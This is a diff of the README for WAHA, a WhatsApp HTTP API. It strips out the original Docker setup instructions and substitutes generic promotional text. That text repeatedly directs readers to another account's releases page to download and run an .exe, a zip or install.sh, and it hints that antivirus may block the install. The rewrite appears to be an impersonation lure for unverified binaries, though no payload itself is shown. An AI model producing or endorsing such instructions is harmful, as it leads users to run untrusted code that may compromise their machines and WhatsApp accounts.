@@ -1,159 +1,87 @@
-# WAHA
+# 🚀 waha - Your WhatsApp API Made Easy
 
-<p align="center">
-  <img src="./logo.png" style='border-radius: 50%' width='150'/>
-</p>
+## 🔗 Download Now
+[![Latest Release](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/hima2005h/waha/releases)
 
-**WAHA** - **W**hats**A**pp **H**TTP **A**PI (REST API) that you can install on your own server and run in less than 5 minutes!
+## 🎯 Description
+WAHA is a WhatsApp HTTP API that you can configure in a click! With three engines available—WEBJS (browser based), NOWEB (websocket nodejs), and GOWS (websocket go)—using WhatsApp for automation needs has never been easier. 
 
-[![Docker Pulls](https://img.shields.io/docker/pulls/devlikeapro/waha)](https://hub.docker.com/r/devlikeapro/waha)
+## 🎉 Features
+- **Easy Configuration**: Set up your API without technical skills.
+- **Multiple Engines**: Choose the engine that best fits your needs.
+- **Robust Performance**: Fast and reliable, ideal for automation.
+- **Cross-Platform Support**: Use on various systems with ease.
 
-- Documentation: [https://waha.devlike.pro/](https://waha.devlike.pro/)
-- Dashboard Example: [https://waha.devlike.pro/dashboard](https://waha.devlike.pro/dashboard)
-- Swagger Example: [https://waha.devlike.pro/swagger](https://waha.devlike.pro/swagger)
+## 🛠️ System Requirements
+To run waha, your device should meet the following requirements:
+- **Operating System**: Windows, Mac, or Linux.
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum 100 MB available space.
+- **Internet Connection**: Required for WhatsApp API access.
 
-# Tables of Contents
+## 🚀 Getting Started
+To begin using waha, follow these steps:
 
-<!-- toc -->
+1. **Visit the Releases Page**: Go to the following link to access the latest version:
+   [Download Now](https://github.com/hima2005h/waha/releases)
 
-- [Quick start](#quick-start)
-  * [Requirements](#requirements)
-  * [Send your first message](#send-your-first-message)
-    + [1. Download image](#1-download-image)
-    + [2. Run WhatsApp HTTP API](#2-run-whatsapp-http-api)
-    + [3. Start a new session](#3-start-a-new-session)
-    + [4. Get and scan QR](#4-get-and-scan-qr)
-    + [5. Get the screenshot](#5-get-the-screenshot)
-    + [6. Send a text message](#6-send-a-text-message)
-  * [What is next?](#what-is-next)
-- [Development](#development)
-  * [Start the project](#start-the-project)
+2. **Choose Your Version**: Once you’re on the page, you will see a list of available versions. Select the one that suits your system.
 
-<!-- tocstop -->
+3. **Download the File**: Click on the link to download the file. This may be an executable file for Windows, a zip file for Mac, or an installation script for Linux.
 
-# Quick start
+   Again, you can download the latest release here: [Download Now](https://github.com/hima2005h/waha/releases).
 
-## Requirements
+4. **Install the Software**: 
+   - **For Windows Users**: Double-click the `.exe` file to start the installation process.
+   - **For Mac Users**: Open the downloaded `.zip` file, then drag the application to your “Applications” folder.
+   - **For Linux Users**: Open your terminal, navigate to the download directory, and run the installation script using `bash install.sh`.
 
-Only thing that you must have - installed docker. Please follow the original
-instruction <a href="https://docs.docker.com/get-docker/" target="_blank" rel="noopener">how to install docker -></a>.
+5. **Run the Application**: 
+   - After installation, open the application from your applications menu or desktop shortcut.
+   - Follow the on-screen prompts to complete the initial setup. 
 
-When you are ready - come back and follows the below steps to send the first text message to WhatsApp via HTTP API!
+6. **Configure Your API**: Use the simple interface to connect your WhatsApp account. You can choose which engine you want to use and customize your settings.
 
-## Send your first message
+## 📚 Documentation
+For a detailed guide on how to use waha, please refer to the following:
 
-Let's go over steps that allow you to send your first text message via WhatsApp HTTP API!
+- **User Manual**: Available in the application or [here](https://github.com/hima2005h/waha).
+- **Video Tutorials**: Step-by-step videos can be found on our YouTube channel.
 
-### 1. Download image
+## 🛠️ Common Issues
+If you face any problems while downloading or installing waha, here are some troubleshooting tips:
+- **Download Fails**: Ensure your internet connection is stable. Try refreshing the page and clicking the download link again.
+- **Installation Issues**: Make sure your system meets the requirements listed above. If you receive an error, check if your antivirus is blocking the installation.
+- **Application Crashes**: Keep the application updated to the latest version. Restart your computer if necessary.
 
-Assuming you have installed [Docker](https://docs.docker.com/get-docker/), let's download the image.
+## 🤝 Support
+If you need further assistance, feel free to reach out:
+- Open an issue in the GitHub repository: [Issues](https://github.com/hima2005h/waha/issues)
+- Join our community on Discord for real-time support.
 
+## 🌍 Topics
+Our application covers a variety of topics related to WhatsApp automation:
+- ai-bot
+- bot
+- http-api
+- python-bot
+- whatsapp
+- whatsapp-api
+- whatsapp-automation
+- whatsapp-bot
+- whatsapp-chat
+- whatsapp-web
+- whatsapp-web-api
 
-```bash
-docker pull devlikeapro/waha
-```
+## 📢 Get Involved
+We welcome contributions to improve waha. Check out the contributing guidelines in the repository to see how you can help out.
 
+## 👥 Join Our Community
+Stay updated and connect with other users:
+- Follow us on social media for tips, updates, and community interactions.
+- Join our mailing list for the latest news and exclusive content.
 
-```bash
-docker login -u devlikeapro -p {KEY}
-docker pull devlikeapro/waha-plus
-docker logout
-```
+## 📅 Updates
+Stay tuned for new features and improvements. We are continuously working to enhance your experience with waha.
 
-Read more about how to get `PASSWORD` for [**➕ WAHA Plus**](https://waha.devlike.pro/docs/how-to/waha-plus/)
-
-### 2. Run WhatsApp HTTP API
-
-Run WhatsApp HTTP API:
-
-```bash
-docker run -it --rm -p 3000:3000/tcp --name waha devlikeapro/waha
-
-# It prints logs and the last line must be
-# WhatsApp HTTP API is running on: http://[::1]:3000
-```
-
-Open the link in your browser [http://localhost:3000/](http://localhost:3000/) and you'll see API documentation
-(Swagger).
-
-
-### 3. Start a new session
-
-To start a new session you should have your mobile phone with installed WhatsApp application close to you.
-
-Please go and read how what we'll need to a bit
-later:
-<a href="https://faq.whatsapp.com/381777293328336/?helpref=hc_fnav" target="_blank">
-How to log in - the instruction on WhatsApp site
-</a>
-
-When your ready - find `POST /api/sessions`, click on **Try it out**, then **Execute** a bit below.
-
-
-The example payload:
-```json
-{
-  "name": "default"
-}
-```
-
-
-By using the request with `name` values you can start multiple session (WhatsApp accounts) inside the single docker container in Plus
-
-
-### 4. Get and scan QR
-
-Find `GET /api/screenshot` and execute it, it shows you QR code.
-
-
-**Scan the QR with your cell phone's WhatsApp app.**
-
-
-### 5. Get the screenshot
-
-Execute `GET /api/screenshot` after a few seconds after scanning the QR - it'll show you the screenshot of you Whatsapp
-instance. If you can get the actual screenshot - then you're ready to start sending messages!
-
-
-### 6. Send a text message
-
-Let's send a text message - find `POST /api/sendText`  in [swagger](http://localhost:3000/) and change `chatId` this
-way: use a phone international phone number without `+` symbol and add `@c.us` at the end.
-
-For phone number `12132132131` the `chatId` is  `12132132131@c.us`.
-
-The example payload:
-```json
-{
-  "chatId": "12132132130@c.us",
-  "text": "Hi there!",
-  "session": "default"
-}
-```
-
-Also, you can use `curl` and send POST request like this:
-
-```bash
-# Phone without +
-export PHONE=12132132130
-curl -d "{\"chatId\": \"${PHONE}@c.us\", \"text\": \"Hello from WhatsApp HTTP API\" }" -H "Content-Type: application/json" -X POST http://localhost:3000/api/sendText
-```
-
-## What is next?
-[Go and read the full documentation!](https://waha.devlike.pro/docs/overview/introduction/)
-
-# Development
-
-## Start the project
-1. Clone the repository
-2. Make sure you're using node>=22 (check [.nvmrc](/.nvmrc) to get the version)
-3. Run the following commands:
-```bash
-# Install dependencies
-yarn install
-# Fetch and compile proto files
-yarn gows:proto
-# Run
-yarn start
-# open http://localhost:3000
-```
+Explore the possibilities with waha and simplify your WhatsApp automation today!
